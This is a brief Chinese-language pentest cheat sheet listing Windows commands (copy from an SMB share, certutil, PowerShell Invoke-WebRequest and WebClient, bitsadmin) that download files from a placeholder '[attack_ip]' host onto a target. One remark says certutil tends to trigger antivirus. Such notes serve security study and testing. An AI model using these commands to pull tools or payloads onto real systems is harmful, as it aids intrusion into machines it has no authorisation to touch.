一些 Windows 的数据传输技巧。

CMD

```powershell
PS C:\Users\sec> copy \\[attack_ip]\[path]\[file] [path]\[file]
```

> 将共享文件复制到本地

certutil

```powershell
PS C:\Users\sec> certutil -urlcache -split -f http://[attack_ip]:[web_port][path]/[file] [path]\[file]
```

> 容易报毒

PowerShell

```powershell
PS C:\Users\sec> powershell -Command "Invoke-WebRequest -Uri http://[attack_ip]:[web_port]/[path]/[file] -OutFile [path]\[file]"
```

```powershell
PS C:\Users\sec> powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[attack_ip]:[web_port]/[path]/[file]', '[path]\[file]')"
```

bitsadmin

```powershell
PS C:\Users\sec> bitsadmin /transfer down "http://[attack_ip]:[web_port]/[path]/[file]" [path]\[file]
```

